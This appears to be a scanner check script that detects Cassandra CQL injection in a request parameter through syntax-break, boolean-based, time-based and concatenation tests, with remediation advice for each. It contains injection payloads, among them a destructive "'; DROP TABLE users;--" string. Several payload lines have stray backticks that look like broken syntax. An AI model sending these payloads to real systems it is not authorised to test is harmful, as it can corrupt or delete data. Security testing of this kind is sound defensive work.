# Cassandra CQL Injection Detection
# Tests syntax break, injection via concatenation, and boolean-based CQLi

given insertion_point: "request"  # For URL params or body in CQL queries

# Extract baseline response
extract original_body from response.body
extract original_status from response.status
extract original_time from response.time

# 1. Syntax Break: Trigger CQL syntax error
send request:
  replace insertion_point with insertion_point + "'"
if regex `Cassandra syntax error|Invalid CQL|unterminated string` in response.body then
  report issue:
    severity: high
    confidence: certain
    name: "Cassandra CQL Injection (Syntax Break)"
    detail: "Cassandra syntax error detected with payload: {insertion_point + '''}. Response: {regex `Cassandra syntax error|Invalid CQL|unterminated string`}"
    remediation: "Use prepared statements; bind parameters."
end if

# 2. Injection Bypass: Append CQL to break WHERE
send request:
  replace insertion_point with insertion_point + "'; DROP TABLE users;--"`  # Classic attempt, though limited
extract bypass_response from response.body

if bypass_response != original_body and response.status == 200 then  # Unexpected success
  report issue:
    severity: high
    confidence: firm
    name: "Cassandra CQL Injection (Bypass)"
    detail: "Potential CQL bypass with DROP payload. Response changed from original."
    remediation: "Enforce prepared statements in drivers (e.g., DataStax)."
end if

# 3. Boolean-Based: True/false conditions in WHERE
send request:
  replace insertion_point with insertion_point + " AND 1=1 ALLOW FILTERING"`  # True, with ALLOW for non-indexed
extract true_response from response.body

send request:
  replace insertion_point with insertion_point + " AND 1=0 ALLOW FILTERING"`  # False
extract false_response from response.body

if true_response != false_response and true_response == original_body then
  report issue:
    severity: high
    confidence: firm
    name: "Cassandra CQL Injection (Boolean-Based)"
    detail: "Response differed between true/false conditions. True payload: {insertion_point + ' AND 1=1 ALLOW FILTERING'}"
    remediation: "Avoid dynamic CQL; use parameterized queries."
end if

# 4. Time-Based: Limited; use heavy query for delay
send request:
  replace insertion_point with insertion_point + " LIMIT 1000000 ALLOW FILTERING"`  # Force large result set
  set timeout to 10 seconds
if response.time > original_time + 5000 then
  report issue:
    severity: high
    confidence: tentative
    name: "Cassandra CQL Injection (Time-Based)"
    detail: "Response delayed by {response.time - original_time}ms with large LIMIT payload."
    remediation: "Limit query sizes; use pagination."
end if
